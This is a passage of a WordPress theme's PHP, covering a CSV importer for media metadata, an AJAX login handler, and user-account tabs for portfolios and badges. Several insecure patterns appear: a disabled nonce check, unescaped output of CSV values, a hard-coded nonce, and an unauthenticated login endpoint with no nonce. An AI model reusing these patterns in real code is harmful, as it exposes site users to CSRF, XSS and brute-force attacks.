    require_once ABSPATH . 'wp-admin/admin.php';
    wp_enqueue_script( 'plupload-handlers' );
    $post_id = 0;
    if ( isset( $_REQUEST['post_id'] ) ) {
        $post_id = absint( $_REQUEST['post_id'] );
        if ( ! get_post( $post_id ) || ! current_user_can( 'edit_post', $post_id ) ) {
            $post_id = 0;
        }
    }
    $notImportedArray = [];
    if ( $_POST ) {
        if ( isset( $_POST['html-upload'] ) && ! empty( $_FILES ) ) {
            // check_admin_referer( 'media-form' );
            // Upload File button was clicked.
            $upload_id = media_handle_upload( 'async-upload', $post_id );
            if ( is_wp_error( $upload_id ) ) {
                //wp_die( $upload_id );
            } else {
                $feat_image_url = wp_get_attachment_url( $upload_id );
                $handle = fopen($feat_image_url, 'r');
                $headers = fgetcsv($handle);
                // $headers = self::getFieldsFromHeaders($headers);
                $fields = [];
                foreach ($headers as $header) {
                    $fields[] = htmlspecialchars(str_replace([' ', '.'], '_', $header)); //self::createInputName($header);
                }
                $headers = $fields;

                $mappedFields = [];
                foreach ($headers as $i => $header) {
                    $input = htmlspecialchars(str_replace([' ', '.'], '_', $header)); //self::createInputName($header);
                    if (!empty($_POST[$input]) && $_POST[$input] != -1) {
                        $mappedFields[$i] = [
                            'header' => $input,
                            'header_index' => $i,
                            'form_field' => sanitize_text_field($_POST[$input])
                        ];
                    }
                }



                $imports = [];

                while (($data = fgetcsv($handle)) !== FALSE) {
                    //echo "<pre>"; print_r($data); "</pre>";
                    if(isset($data[0]) && !empty($data[0])){
                        $args = array(
                            'post_type' => 'attachment',
                            'post__in' => $gallery_image_ids,
                            'nopaging' => true,
                            'orderby' => 'title',
                            'order' => $current_order,
                            's' => $data[0],
                            'exact' => 1,
                            'sentence' => true,
                        );
                        $all_media_items = get_posts($args);
                        if(count($all_media_items)>0){
                            foreach($all_media_items as $m_key=>$m_item){

                                if(isset($data[1]) && !empty($data[1])){
                                    update_post_meta( $m_item->ID, '_od_image_month', $data[1] );
                                }
                                if(isset($data[2]) && !empty($data[2])){
                                    update_post_meta( $m_item->ID, '_od_image_year', $data[2] );
                                }
                                if(isset($data[3]) && !empty($data[3])){
                                    update_post_meta( $m_item->ID, '_od_image_dataset', $data[3] );
                                }
                                if(isset($data[4]) && !empty($data[4])){
                                    update_post_meta( $m_item->ID, '_od_image_rank', $data[4] );
                                }
                            }
                        } else {
                           $error_values = array();
                            if(isset($data[0]) && !empty($data[0])){
                                $error_values[]=$data[0];
                            }
                            if(isset($data[1]) && !empty($data[1])){
                                $error_values[]=$data[1];
                            }
                            if(isset($data[2]) && !empty($data[2])){
                                $error_values[]=$data[2];
                            }
                            if(isset($data[3]) && !empty($data[3])){
                                $error_values[]=$data[3];
                            }
                            if(isset($data[4]) && !empty($data[4])){
                                $error_values[]=$data[4];
                            }
                            $notImportedArray[] = $error_values;
                        }
                    }
                }



            }

        }
    }

    $max_upload_size = wp_max_upload_size();
	if ( ! $max_upload_size ) {
		$max_upload_size = 0;
	}
    ?>
    <div class="wrap">
  <h1><?php echo esc_html('Import Media Metadata' ); ?></h1>
  <form enctype="multipart/form-data" method="post" action="<?php echo esc_url( admin_url( 'upload.php?page=kp-import-medial-metadata' ) ); ?>" class="media-upload-form type-form validate html-uploader" id="file-form">

    <div id="media-upload-notice">
      <p>Download <a href="<?php echo get_stylesheet_directory_uri(); ?>/assets/media/sample-gallery-metadata.csv" download>Sample CSV</a> for import gallery metadata.</p>
    </div>
    <?php if(count($notImportedArray)>0){ ?>
    <div id="media-upload-error">
      There is a error in import data.
      <br>
      <?php
      foreach ($notImportedArray as $key => $e_dt) {
        if(isset($e_dt[0]) && !empty($e_dt[0])){
            echo $e_dt[0].', ';
        }
      }
      ?>
    </div>
    <?php } ?>



    <div id="html-upload-ui" class="hide-if-js">
      <p id="async-upload-wrap">
        <label class="screen-reader-text" for="async-upload">
          Upload </label>
        <input type="file" name="async-upload" id="async-upload" required>
        <input type="submit" name="html-upload" id="html-upload" class="button button-primary" value="Upload"> <a href="#" onclick="try{top.tb_remove();}catch(e){}; return false;">Cancel</a>
      </p>
      <div class="clear"></div>

    </div>
    <p>Please upload UTF-8 encoded csv file.</p>
    <p class="max-upload-size">
      Maximum upload file size: <?php echo $max_upload_size; ?> MB.</p>

    <script type="text/javascript">
    var post_id = 0,
      shortform = 3;
    </script>
    <input type="hidden" name="post_id" id="post_id" value="0">
    <input type="hidden" id="_wpnonce" name="_wpnonce" value="8d59b7e7fd"><input type="hidden" name="_wp_http_referer" value="<?php echo esc_url( admin_url( 'upload.php?page=kp-import-medial-metadata' ) ); ?>">
    <div id="media-items" class="hide-if-no-js"></div>
  </form>
    </div>
<?php
}

//CUstom functionality start. 20/2/2025

function log_warnings_instead() {
    ini_set('display_errors', 0);          
    ini_set('log_errors', 1);             
    ini_set('error_log', WP_CONTENT_DIR . '/warnings.log'); 
    error_reporting(E_ALL);  
}

// Call it
log_warnings_instead();


function custom_wp_login() {
    $username = sanitize_text_field($_POST['username']);
    $password = $_POST['password'];
    $remember = isset($_POST['remember']) ? true : false;

    $creds = array(
        'user_login'    => $username,
        'user_password' => $password,
        'remember'      => $remember
    );

    $user = wp_signon($creds, false);

    if (is_wp_error($user)) {
        echo json_encode(['success' => false, 'message' => 'Invalid username or password.']);
    } else {
        echo json_encode(['success' => true, 'message' => 'Login successful! Redirecting...']);
    }

    wp_die();
}

add_action('wp_ajax_custom_wp_login', 'custom_wp_login');
add_action('wp_ajax_nopriv_custom_wp_login', 'custom_wp_login');
// -----------------------------------------------------------------------
require_once get_stylesheet_directory() . '/custom-function/profile-update.php';

//-------------------------ragistration--------------------------------


//require_once get_stylesheet_directory() . '/custom-function/user_register.php';
require_once get_stylesheet_directory() . '/custom-function/ragister.php';
require_once get_stylesheet_directory() . '/custom-function/liked/like_functionality.php';



function enqueue_custom_script() {
wp_enqueue_script(
    'like-functionality',
    get_stylesheet_directory_uri() . '/custom-function/js/custom-script.js', 
    array('jquery'),
    filemtime(get_stylesheet_directory() . '/custom-function/js/custom-script.js'), 
    true
);

    // Localize script to pass AJAX URL and nonce
    wp_localize_script('like-functionality', 'ajax_object', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce'    => wp_create_nonce('like_post_nonce'), 
        'is_logged_in' => is_user_logged_in() ? 'true' : 'false',
        'login_url' => wp_login_url(),
        'current_user_id' => get_current_user_id(), 
        'post_id' => get_the_ID() ,
         'site_url'      => site_url() 
    ));
    wp_enqueue_script(
        'sweetalert2',
        'https://cdn.jsdelivr.net/npm/sweetalert2@11',
        array(),
        '11.0',
        true
    );
}
add_action('wp_enqueue_scripts', 'enqueue_custom_script');

// For ajax on Admin side on challenges post side
function enqueue_custom_script_admin($hook) {
   
    // if ($hook !== 'post.php' && $hook !== 'post-new.php') {
    //     return;
    // }

    // if (get_post_type() !== 'challenges') {
    //     return;
    // }

    $post_type = get_post_type();

    $is_challenges_screen = (
        ($hook === 'post.php' || $hook === 'post-new.php') &&
        $post_type === 'challenges'
    );

    $is_custom_submissions_screen = ($hook === 'toplevel_page_dataset-download-form-submissions');

    // Only enqueue if either condition is true
    if (!$is_challenges_screen && !$is_custom_submissions_screen) {
        return;
    }


    wp_enqueue_script(
        'like-functionality',
        get_stylesheet_directory_uri() . '/custom-function/js/custom-script.js', 
        array('jquery'),
        filemtime(get_stylesheet_directory() . '/custom-function/js/custom-script.js'), 
        true
    );

    wp_localize_script('like-functionality', 'ajax_object', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce'    => wp_create_nonce('like_post_nonce'), 
        'is_logged_in' => is_user_logged_in() ? 'true' : 'false',
        'login_url' => wp_login_url(),
        'current_user_id' => get_current_user_id(), 
        'post_id' => get_the_ID(),
        'site_url' => site_url()
    ));

}
add_action('admin_enqueue_scripts', 'enqueue_custom_script_admin');


function custom_uwp_account_tabs($tabs) {
    $tabs['portfolio-highlights'] = array(
        'title' => __('Portfolio Highlights'),
        'icon'  => 'fas fa-briefcase me-2', 
    );

    $tabs['portfolio-section'] = array(
        'title' => __('Add portfolio'),
        'icon'  => 'fas fa-images me-2', 
    );

     $tabs['user_badges'] = array(
        'title' => __('My Badges'),
        'icon'  => 'fa-solid fa-ranking-star me-2', 
    );
     $tabs['social_media_section'] = array(
            'title' => __('Social media'),
            'icon'  => 'fas fa-share-alt me-1 fa-fw',
        );

      if (current_user_can('administrator')) {
        $tabs['admin_dashboard'] = array(
            'title' => __('Admin section'),
            'icon'  => 'fas fa-asterisk me-1 fa-fw',
        );
    }
    return $tabs;
}
add_filter('uwp_account_available_tabs', 'custom_uwp_account_tabs', 10, 1);

// Step 2: Customize the tab title
function custom_uwp_tab_title($title, $type) {
    if ($type === 'portfolio-highlights') {
        $title = __('Portfolio Highlights', 'your-theme-textdomain');
    }
    elseif ($type === 'portfolio-section') {
        $title = __('Add portfolio', 'your-theme-textdomain');
    }
    elseif ($type === 'user_badges') {
        $title = __('Achievements & Rewards', 'your-theme-textdomain');
    }
    elseif ($type === 'social_media_section') {
        $title = __('Add your social media profile', 'your-theme-textdomain');
    }
    return $title;
}
add_filter('uwp_account_page_title', 'custom_uwp_tab_title', 10, 2);

// Step 3: Display content for the new tab
function custom_uwp_tab_content($type) {
    if ($type === 'portfolio-highlights') { 
         get_template_part('template-parts/header_v1');
         get_template_part('template-parts/footer_v1');
       ?>
      <style>.portfolio-loader-edit img {width: 80px;}
        button.btnn {
    background-color: #ffbb09;
    color: white;
    padding: 5px 10px;
    border-radius: 10px;
    border: 1px #ffbb09;
}
      </style>
       <div class="col-lg-12">
            <!-- <div class="mb-3 form-check">
                <input type="checkbox" class="form-check-input" id="hide_from_front" name="hide_from_front" value="yes">
                <label class="form-check-label" for="hide_from_front">Hide all portfolio from public view</label>
            </div> -->

     <?php       if (is_user_logged_in()) {
    $user_id = get_current_user_id();
    
    // Handle form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $hide_portfolio = isset($_POST['hide_from_front']) ? 'yes' : 'no';
        update_user_meta($user_id, 'hide_portfolio_from_front', $hide_portfolio);
        echo '<div class="alert alert-success">Settings saved!</div>';
    }
    
    // Get current setting
    $current_setting = get_user_meta($user_id, 'hide_portfolio_from_front', true);
    ?>
    
    <div class="container mt-5">
        <form method="post">
            <div class="mb-3 form-check">
                <input type="checkbox" class="form-check-input" id="hide_from_front" name="hide_from_front" value="yes" <?php checked($current_setting, 'yes'); ?>>
                <label class="form-check-label" for="hide_from_front">Hide my portfolio from public view</label>
                <button type="submit" class="btnn">Save</button>
            </div>
            
        </form>
    </div>
    <?php
} else {
    echo '<div class="container mt-5"><div class="alert alert-warning">Please login to access these settings.</div></div>';
}

?>

                    <div class="profile-card">
                        <ul class="nav nav-tabs tabs-profile border-bottom-0" id="portfolioTabs">
                            <li class="nav-item">
                                <a class="nav-link active mb-2 " id="submitted-projects-tab" data-bs-toggle="tab" href="#submitted-projects">Submitted Porfolios</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link ms-2 " id="completed-challenges-tab" data-bs-toggle="tab" href="#completed-challenges">Submitted Challenges details</a>
                            </li> 
                        </ul>


                      <!-- featured portfolio  start  -->
                        <div class="tab-content pt-3 " id="portfolio">

                        <div class="tab-pane fade show active" id="submitted-projects">


<div class="container">
                        

<div id="portfolio-container" class="row">
        <?php
        $args = array(
            'post_type'      => 'portfolios',
            'posts_per_page' => 8,
            'post_status'    => 'publish',
			'author'         => get_current_user_id(),
        );
        $portfolio_query = new WP_Query($args);

        if ($portfolio_query->have_posts()) :
            while ($portfolio_query->have_posts()) : $portfolio_query->the_post();
                $portfolio_image = get_the_post_thumbnail_url(get_the_ID(), 'medium');
                $portfolio_title = get_the_title();
                $portfolio_link  = get_permalink();
                $portfolio_author = get_the_author();
                ?>
                <div class="col-lg-4 col-md-6 col-sm-12">
                    <div class="portfolio-item">
                        <a href="<?php echo esc_url($portfolio_link); ?>" class="portfolio-link">
                            <div class="portfolio-image">
                                <img src="<?php echo esc_url($portfolio_image); ?>" alt="<?php echo esc_attr($portfolio_title); ?>">
                                <div class="portfolio-caption">
                                    <h3 class="portfolio-title"><?php echo esc_html($portfolio_title); ?></h3>
                                </div>
                                <!--<button class="btn-like"><i class="fa-regular fa-heart"></i></button>-->
                                <!--<button class="btn-save"><i class="fa-regular fa-bookmark"></i></button>-->
                <button class="btn-like like_click <?php echo (is_user_logged_in() && in_array(get_the_ID(), (array) get_user_meta(get_current_user_id(), 'liked_posts', true))) ? 'active' : ''; ?>" data-post-id="<?php echo get_the_ID(); ?>">

                  <i class="fa-regular fa-heart"></i>
             </button>

       <button class="btn-save bookmark_click <?php echo (is_user_logged_in() && in_array(get_the_ID(), (array) get_user_meta(get_current_user_id(), 'bookmarked_posts', true))) ? 'active' : ''; ?>" data-post-id="<?php echo get_the_ID(); ?>">
              <i class="fa-regular fa-bookmark"></i>
     </button>
                            </div>
                        </a>
                        <div class="mt-3 viewer d-flex align-items-center justify-content-between">
                             <div class="d-flex align-items-center">

         <?php
     $author_id = get_the_author_meta('ID');
     $default_url = uwp_build_profile_tab_url($author_id);// userswp plugin author url 
     $username = basename($default_url); 
     $base_url = 'https://datadna.onyxdata.co.uk/profile/';
     $author_profile_url = $base_url . '?uwp_profile=' . urlencode($username);

    ?>                       
        <a href="<?php echo esc_url($author_profile_url) ;?>" class="portfolio-view">
            <?php
            $author_id = get_the_author_meta('ID');
            $author_image = get_avatar_url($author_id, ['size' => 100]); // Get author's profile image

            if ($author_image) {
                echo '<img src="' . esc_url($author_image) . '" alt="Author">';
            } else {
                echo '<img src="' . get_template_directory_uri() . '/assets/images/view.png" alt="viewer">';
            }
            ?>
    
        <span class="portfolio-viewer-name">By <?php echo esc_html(get_the_author()); ?></span>
         </a>
    </div>
                            <div class="d-flex align-items-center">
                                <div>
                                    <i class="fa-solid fa-heart"></i>
                             <span class="portfolio-liked">
                                <?php $like_count = (int) get_post_meta(get_the_ID(), 'like_count', true);
                                    echo $like_count ? $like_count : 0; 
                                 ?>
                             </span>
                                </div>
                                <div class="ms-2">
                                    <i class="fa fa-eye" aria-hidden="true"></i>
                            <span class="portfolio-liked portfolio_view_count">
                            <?php $view_count = (int) get_post_meta(get_the_ID(), 'view_count', true);
                                  echo $view_count ? $view_count : 0; 
                             ?>
                                    </span>
                                </div>
                            </div>
                        </div>
                        
                         <!-- Edit and Delete Icons -->
                   <?php     $current_user = wp_get_current_user();
                      // if ($current_user->ID === 53) { //Honey
                       ?>
                        <div class="portfolio-actions mt-2 text-right">
                            
                            <div class="portfolio-loader-edit" style="display: none; text-align: center;">
                   <img src="https://datadna.onyxdata.co.uk/wp-content/themes/onyxdata-child/custom-function/images/Loading-icon-unscreen.gif" alt="Loading..." width="50"></div>

                            <span class="edit-portfolio" data-id="<?php echo get_the_ID(); ?>" title="Edit">
                                <i class="fa fa-edit"></i>
                            </span>
                            <span class="delete-portfolio ms-2" data-id="<?php echo get_the_ID(); ?>" title="Delete">
                                <i class="fa fa-trash"></i>
                            </span>
                        </div>
                        <?php //} ?>
                        
                    </div>
                </div>
                <?php
            endwhile;
            wp_reset_postdata();
        else :
            echo '<p>Currently you had not uploaded any portfolio.</p>';
        endif;
        ?>
    </div>

    <!-- Edit portfolio Popup form-->
    <div class="overlay-edit-popup" id="portfolio-overlay"></div>
<div class="edit-portfolio-popup" id="edit-portfolio-popup">
    <form id="edit-portfolio-form" enctype="multipart/form-data">
        <h3>Edit Portfolio</h3>
        <div class="form-group">
            <label for="edit_portfolio_title">Portfolio Title</label>
            <input type="text" id="edit_portfolio_title" name="portfolio_title" class="form-control" required>
        </div>
        <div class="form-group">
            <label for="edit_portfolio_description">Description</label>
            <textarea id="edit_portfolio_description" name="portfolio_description" class="form-control" rows="4"></textarea>
        </div>
        <div class="form-group">
            <label>Visualization Tools</label>
            <select class="form-control edit-select2" id="edit_visual_skills" name="skills[]" multiple="multiple">
                <option value="power_bi">Power BI</option>
                <option value="python">Python</option>
                <option value="excel">Excel</option>
                <option value="qlik">Qlik</option>
                <option value="zoomcharts">ZoomCharts</option>
                <option value="tableau">Tableau</option>
                <option value="other">Other</option>
            </select>
        </div>
        <div class="form-group">
            <label for="edit_portfolio_url">Portfolio URL (if any)</label>
            <input type="url" id="edit_portfolio_url" name="portfolio_url" class="form-control">
        </div>
        <div class="form-group">
            <label for="edit_portfolio_images">Portfolio Images (Can be multiple images)</label>
            <input type="file" id="edit_portfolio_images" name="portfolio_images[]" class="form-control" multiple accept="image/*">
            <small>Current images: <span id="current_portfolio_images"></span></small>
        </div>
        <div class="form-group">
            <label for="edit_portfolio_thumbnail">Featured Image</label>
            <input type="file" id="edit_portfolio_thumbnail" name="portfolio_thumbnail" class="form-control" accept="image/*">
            <small>Current thumbnail: <span id="current_portfolio_thumbnail"></span></small>
        </div>
        <div class="form-group">
            <label for="edit_powerbi_report">Upload Power BI Report (.pbix file) – Max 50MB</label>
            <input type="file" id="edit_powerbi_report" name="powerbi_report" class="form-control" accept=".pbix">
            <small>Current file: <span id="current_powerbi_file"></span></small>
        </div>
        <div class="form-group">
            <label for="edit_powerbi_report_url">OR Paste Power BI Report Link</label>
            <input type="url" id="edit_powerbi_report_url" name="powerbi_report_url" class="form-control" placeholder="Paste Power BI Report URL here">
        </div>


        <!-- Associated Challenge Field -->
        <div class="form-group">
            <label for="edit_portfolio_challenge">Associate with an Ongoing Challenge (Optional)</label>
            <select class="form-control edit-select2" id="edit_portfolio_challenge" name="challenge">
                <option value="">-- None --</option>
                <?php
                $today = date('Ymd');
                $args = array(
                    'post_type'      => 'challenges',
                    'posts_per_page' => -1, 
                    'meta_key'       => 'challenges_date',
                    'orderby'        => 'meta_value',
                    'order'          => 'ASC', // Show upcoming challenges first
                    'meta_query'     => array(
                        array(
                            'key'     => 'challenges_date',
                            'value'   => $today,
                            'compare' => '>=', 
                            'type'    => 'DATE'
                        )
                    )
            );
                $challenges_query = new WP_Query($args);
                if ($challenges_query->have_posts()) :
                    while ($challenges_query->have_posts()) : $challenges_query->the_post();
                        echo '<option value="' . esc_attr(get_the_ID()) . '">' . esc_html(get_the_title()) . '</option>';
                    endwhile;
                    wp_reset_postdata();
                endif;
                ?>
            </select>
        </div>
        <input type="hidden" id="edit_portfolio_id" name="portfolio_id">
        <button type="submit" class="btn btn-success">Update</button>
        <button type="button" class="btn btn-secondary" id="close-popup-portfolio">Close</button>
    </form>
</div>


</div>

<!-- CSS for Styling -->
<style>
    form#edit-portfolio-form {
    max-height: 70vh;
    overflow-y: scroll;
    padding:10px 20px;
}
    .portfolio-actions {
        font-size: 18px;
    }
    .edit-portfolio, .delete-portfolio {
        cursor: pointer;
        color: #007bff;
    }
    .delete-portfolio {
        color: #dc3545;
    }
    .edit-portfolio:hover, .delete-portfolio:hover {
        opacity: 0.8;
    }
    .edit-portfolio-popup {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        z-index: 1000;
        width: 500px;
        max-width: 90%;
    }
/*    .overlay {*/
    .overlay-edit-popup{
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.6);
        z-index: 999;
    }
    .edit-portfolio-popup h3 {
        margin: 0 0 15px;
        color: #333;
        font-size: 20px;
        border-bottom: 1px solid #eee;
        padding-bottom: 10px;
    }
    .form-group { margin-bottom: 15px; }
    .form-control, .form-control-file { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
    .btn { padding: 8px 15px; margin-right: 10px; }
    @media (max-width: 768px) {
        .edit-portfolio-popup { width: 90%; }
        .portfolio-item { margin-bottom: 20px; }
    }
</style>

<!-- JavaScript for Edit/Delete -->

    
    
    
  </div>

</div>
       <div class="tab-pane fade" id="completed-challenges">

                            
                             <!-- Dataset Challenges Section -->
                             <div id="dataset_challenge">
                                
                              
                                    <div class="row mt-3">
         <?php echo do_shortcode("[datadna_dashboard]"); ?>
                                    </div>
                            </div>
                            <!-- Dataset Challenges Section End -->
                            </div>
                        </div>
              <!-- featured portfolio  end  -->
                    </div>

                </div>
       
     <?php
    }

    if ($type === 'portfolio-section') { 
         get_template_part('template-parts/header_v1');
         get_template_part('template-parts/footer_v1');

          ?>
        <form id="portfolio-submission-form" enctype="multipart/form-data">
    <div class="mb-3">
        <label for="portfolio-title" class="form-label">Portfolio Title</label>
        <input type="text" name="portfolio_title" id="portfolio-title" class="form-control" required>
    </div>

    <div class="mb-3">
        <label for="portfolio-description" class="form-label">Description</label>
        <textarea name="portfolio_description" id="portfolio-description" class="form-control" rows="4"></textarea>
    </div>


<div class="mb-3">
    <label class="form-label">Visualization tools </label><br>
    <select class="form-control select2" id="visual_skills" name="skills[]" multiple="multiple">    
        <option value="power_bi">Power BI</option>
        <option value="python">Python</option>
        <option value="excel">Excel</option>
        <option value="qlik">Qlik</option>
        <option value="zoomcharts">ZoomCharts</option>
        <option value="tableau">Tableau</option>
        <option value="other">Other</option>
    </select>
</div>

    <div class="mb-3">
        <label for="portfolio-url" class="form-label">Portfolio URL (if any)
            <!-- Info Tooltip Icon -->
        <span class="ms-1" data-bs-toggle="tooltip" data-bs-placement="top" 
              title="A Portfolio URL is a link to your personal website or online portfolio showcasing your work (e.g., Behance, GitHub, personal site). Supported formats: Any valid URL (http:// or https://).">
            <i class="fas fa-info-circle"></i>
        </span>
        </label>
        <input type="url" name="portfolio_url" id="portfolio-url" class="form-control">
    </div>

    <div class="mb-3">
        <label class="form-label">Portfolio Images ( Can be multiple images )</label>
        <input type="file" name="portfolio_images[]" class="form-control" multiple accept="image/*">
    </div>

    <div class="mb-3">
        <label class="form-label">Featured Image</label>
        <input type="file" name="portfolio_thumbnail" class="form-control" accept="image/*" required>
    </div>


<!-- Reports section -->
<div class="mb-3">
    <label class="form-label">Upload Power BI Report (.pbix file)– Max 50MB </label>
    <input type="file" name="powerbi_report" id="powerbi_report" class="form-control" accept=".pbix">
</div>
<div class="mb-3">
    <label class="form-label">OR Paste Power BI Report Link
    <!-- Info Tooltip Icon -->
        <span class="ms-1" data-bs-toggle="tooltip" data-bs-placement="top" 
              title="A Power BI Report URL is a direct link to a specific Power BI report or dashboard (e.g., app.powerbi.com/...). Supported formats: Power BI report URLs starting with https://app.powerbi.com/.">
            <i class="fas fa-info-circle"></i>
        </span>
    </label>
    <input type="url" name="powerbi_report_url" class="form-control" placeholder="Paste Power BI Report URL here">
</div>



<div class="mb-3">
        <label class="form-label">Associate with an Ongoing Challenge (Optional)</label>
        <select class="form-control select2" id="portfolio_challenge" name="challenge">
            <option value="">None</option> <!-- Default empty option -->
            <?php
         
           $today = date('Ymd');
           $args = array(
                'post_type'      => 'challenges',
                'posts_per_page' => -1, 
                'meta_key'       => 'challenges_date',
                'orderby'        => 'meta_value',
                'order'          => 'ASC', // Show upcoming challenges first
                'meta_query'     => array(
                    array(
                        'key'     => 'challenges_date',
                        'value'   => $today,
                        'compare' => '>=', 
                        'type'    => 'DATE'
                    )
                )
            );

            $challenges_query = new WP_Query($args);
            if ($challenges_query->have_posts()) :
                while ($challenges_query->have_posts()) : $challenges_query->the_post();
                    echo '<option value="' . esc_attr(get_the_ID()) . '">' . esc_html(get_the_title()) . '</option>';
                endwhile;
                wp_reset_postdata();
            endif;
            ?>
        </select>
    </div>


    <button type="submit" class="btn btn-primary submit_portfo">Submit Portfolio</button>
    
    <div id="portfolio-loader" style="display: none;">
    <img src="<?php echo get_stylesheet_directory_uri(); ?>/custom-function/images/Loading-icon-unscreen.gif" alt="Loading..." width="50">
</div>
</form>

<div id="portfolio-message" class="mt-3"></div>

<script>
jQuery(document).ready(function($) {
        // Initialize Select2
        $('#visual_skills').select2({
            placeholder: 'Select skills and tools', // Placeholder text
            allowClear: true, // Allow clearing selected options
            width: '100%' // Make the dropdown full width
        });
      

    $('#portfolio-submission-form').on('submit', function(e) {
        e.preventDefault();
         var formData = new FormData(this);
         formData.append('action', 'save_portfolio_submission');

        // Validate that either file or URL is provided
        var fileInput = $('input[name="powerbi_report"]')[0];
        var fileInput = $('#powerbi_report')[0];
        var maxSize = 50 * 1024 * 1024; // 50 MB in bytes
        if (fileInput.files && fileInput.files[0]) {
            if (fileInput.files[0].size > maxSize) {
                alert('File size exceeds 50 MB limit. Please upload a smaller file.');
                return; // Stop form submission
            }
        }

    var urlInput = $('input[name="powerbi_report_url"]').val();

    //file input upload powerbi report end
        $('.submit_portfo').prop('disabled', true);
        $('#portfolio-loader').show();
        $('#portfolio-message').html(''); // Clear previous messages
        $.ajax({
            url: ajax_object.ajax_url,
            type: 'POST',
            data: formData,
            processData: false,
            contentType: false,
            success: function(response) {
                  $('#portfolio-loader').hide();
                  $('.submit_portfo').prop('disabled', false);
                if (response.success) {
                    $('#portfolio-message').html('<div class="alert alert-success">' + response.data.message + '</div>');
                    $('#portfolio-submission-form')[0].reset();
                    $('#visual_skills').val(null).trigger('change'); // Reset Select2
                  
                } else {
                    $('#portfolio-message').html('<div class="alert alert-danger">' + response.data.message + '</div>');
                     $('#portfolio-submission-form')[0].reset();
                    $('#visual_skills').val(null).trigger('change');
                }
            },
            error: function() {
                $('#portfolio-loader').hide();
                $('.submit_portfo').prop('disabled', false); 
                $('#portfolio-message').html('<div class="alert alert-danger">Something went wrong. Try again!</div>');
            }
        });
    });

document.addEventListener('DOMContentLoaded', function () {
        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
        tooltipTriggerList.map(function (tooltipTriggerEl) {
            return new bootstrap.Tooltip(tooltipTriggerEl);
        });
    });
});
</script>

        <style>
            .form-label { font-weight: bold; }
            .form-control { border-radius: 8px; padding: 10px; }
            .btn-primary {
                background-color: #007bff; border: none; padding: 12px;
                font-size: 16px; border-radius: 8px;
            }
            .btn-primary:hover { background-color: #0056b3; }
            button.btn.btn-primary.submit_portfo:hover {
    color: #ffbb09 !important;
        }
        #portfolio-loader img {
            width: 110px;
        }
        #portfolio-submission-form .select2-container--default .select2-selection--multiple:after {
            content: '\25BC'; /* Unicode for down arrow ▼ */
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 12px;
            color: #697177;
            pointer-events: none; 
        }

        </style>
        <?php  
   }

   if ($type === 'user_badges') { 
        if (!is_user_logged_in()) {
        echo '<p>Please log in to see your dashboard.</p>';
        return;
     }

    $user_id = get_current_user_id();

    $participant_points = (int) get_user_meta($user_id, 'datadna_participant_points', true);
    $participant_posts = get_user_meta($user_id, 'datadna_participant_posts', true) ?: [];
    $participant_count = count($participant_posts);


    $total_points = get_user_meta($user_id, 'datadna_total_points', true) ?: 0;

    $badges = get_user_meta($user_id, 'datadna_user_badges', true) ?: array();
    $non_participant_badges = array_filter($badges, function($badge) {
    return $badge !== 'Participant';
});
    $badge_counts = array_count_values(array_values($non_participant_badges));
    $badge_base_path = get_stylesheet_directory_uri() . '/custom-function/images/';
    
    $badge_images = array(
        'Winner' => $badge_base_path . 'Winner-Icon.png', 
        'Runner Up' => $badge_base_path . 'RunnerUp-Icon.png',
        'ZoomCharts Mini Challenge - Winner' => $badge_base_path . 'ZoomCharts-Mini-Challenge-Winner-Icon.png',
        'ZoomCharts Mini Challenge - Top 5' => $badge_base_path . 'ZoomCharts-Top5.png',
        'The Creative Head' => $badge_base_path . 'TheCreativeHead-Icon.png',
        'The Storyteller' => $badge_base_path . 'Thestoryteller-Icon.png',
        'The Problem Solver' => $badge_base_path . 'TheProblemSolver.png',
        'The Accessibility' => $badge_base_path . 'The-Accessibility-Icon.png',
        'Participant' => $badge_base_path . 'Participant-Icon.png',
    );

   // $badge_counts = array_count_values(array_values($badges));
    ?>
    <div class="col-lg-12 col-md-6 col-sm-12">
        <div class="profile-card">
            <div class="badges-points-section">
                <!-- <h4 class="mb-3">Achievements & Rewards</h4> -->
                
                <!-- Points & Progress -->
                <div class="points-box p-3 mb-4 bg-light rounded">
                    <h5>Your Total Points:</h5>
                    <span class="badge points"><?php echo number_format($total_points + $participant_points); ?> Points</span>
                   <strong><?php echo $participant_points; ?></strong> from participation, 
                    <strong><?php echo $total_points; ?></strong> from other challenges.

                    <p class="mt-2">Keep engaging to earn more rewards!</p>
                </div>
                
                <!-- Badges Section -->
                <h5 class="mb-3">Your Badges</h5>
                 <p class="text-muted mb-4">
                Participant: <strong><?php echo $participant_count; ?></strong> | 
                Other Badges: <strong><?php echo array_sum($badge_counts); ?></strong>
            </p>

                <div class="row justify-content-center mt-4">

                    <?php if ($participant_count > 0 && isset($badge_images['Participant'])): ?>
                    <div class="col-lg-3 col-md-6 mb-2 text-center">
                        <div class="achievements-card">
                            <img src="<?php echo esc_url($badge_images['Participant']); ?>"
                                 class="badge-icon" alt="Participant">
                            <p>Participant <span>(<?php echo $participant_count; ?>)</span></p>
                        </div>
                    </div>
                <?php endif; ?>

                    <?php
                    //foreach ($badge_images as $badge_name => $badge_image) {
                  //       foreach ($badge_counts as $badge_name => $count) {
                  //       if (isset($badge_images[$badge_name]) && $count > 0) {
                  //       $badge_image = $badge_images[$badge_name];
                       
                  //       ?>
                       
                        <!--  <div class="col-lg-3 col-md-6 mb-2 text-center">
                                 <div class="achievements-card">
                                     <img src="<?php echo esc_url($badge_image); ?>" 
                                          class="badge-icon" alt="<?php echo esc_attr($badge_name); ?>">
                                     <p><?php echo esc_html($badge_name); ?>
                                         <span>(<?php echo $count; ?>)</span>
                                     </p>
                                 </div>
                             </div>
 -->
                         <?php
                  //   }
                  // }

                    ?>       <!-- Show all other badges -->
                <?php foreach ($badge_counts as $badge_name => $count): ?>
                    <?php if (isset($badge_images[$badge_name])): ?>
                        <div class="col-lg-3 col-md-6 mb-2 text-center">
